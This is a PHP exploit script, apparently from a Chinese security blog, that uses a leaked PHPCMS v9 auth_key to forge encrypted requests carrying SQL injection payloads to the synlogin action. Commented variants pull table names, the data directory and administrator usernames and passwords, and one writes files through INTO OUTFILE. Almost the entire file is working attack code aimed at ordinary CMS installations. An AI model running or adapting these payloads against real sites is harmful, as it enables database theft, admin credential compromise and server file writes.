<?php
/**
 * Created by 独自等待
 * Date: 2015/7/17
 * Time: 21:08
 * Name: phpcmsv9_authkey.php
 * 独自等待博客：http://www.waitalone.cn/
 */
function sys_auth($string, $operation = 'ENCODE', $key = '', $expiry = 0)
{
    $key_length = 4;
    $key = md5($key != '' ? $key : pc_base::load_config('system', 'auth_key'));
    $fixedkey = md5($key);
    $egiskeys = md5(substr($fixedkey, 16, 16));
    $runtokey = $key_length ? ($operation == 'ENCODE' ? substr(md5(microtime(true)), -$key_length) : substr($string, 0, $key_length)) : '';
    $keys = md5(substr($runtokey, 0, 16) . substr($fixedkey, 0, 16) . substr($runtokey, 16) . substr($fixedkey, 16));
    // echo $keys . "\n";
    $string = $operation == 'ENCODE' ? sprintf('%010d', $expiry ? $expiry + time() : 0) . substr(md5($string . $egiskeys), 0, 16) . $string : base64_decode(substr($string, $key_length));
    $i = 0;
    $result = '';
    $string_length = strlen($string);
    for ($i = 0; $i < $string_length; $i++) {
        $result .= chr(ord($string{$i}) ^ ord($keys{$i % 32}));
    }
    if ($operation == 'ENCODE') {
        return $runtokey . str_replace('=', '', base64_encode($result));
    } else {
        if ((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() > 0) && substr($result, 10, 16) == substr(md5(substr($result, 26) . $egiskeys), 0, 16)) {
            return substr($result, 26);
        } else {
            return '';
        }
    }
}
$authkey = $argv[1];
echo sys_auth("action=synlogin&uid=1' and updatexml(1,concat('~',md5(1)),1)#", 'ENCODE', $authkey);
// echo sys_auth("action=synlogin&uid=1' and updatexml(1,concat('~',@@datadir),1)#", 'ENCODE', 'IMQSpKuRPEgTrukSwZcgzWinD5nD5nMw');
// echo sys_auth("action=synlogin&uid=1' and updatexml(1,concat('~',(select group_concat(table_name) from information_schema.tables where table_schema=database() limit 1)),1)#", 'ENCODE', 'IMQSpKuRPEgTrukSwZcgzWinD5nD5nMw');
// echo sys_auth("action=synlogin&uid=1' and updatexml(1,concat('~',(select group_concat(username,password) from v9_admin limit 1)),1)#", 'ENCODE', 'IMQSpKuRPEgTrukSwZcgzWinD5nD5nMw');

//echo sys_auth('action=synlogin&uid=1\' into outfile \'D:/wamp/www/sys7.txt\' fields terminated by \'111111\'#', 'ENCODE', 'B2kg1lKye5aSCELoBXxp06DRiNkP0zmQ');
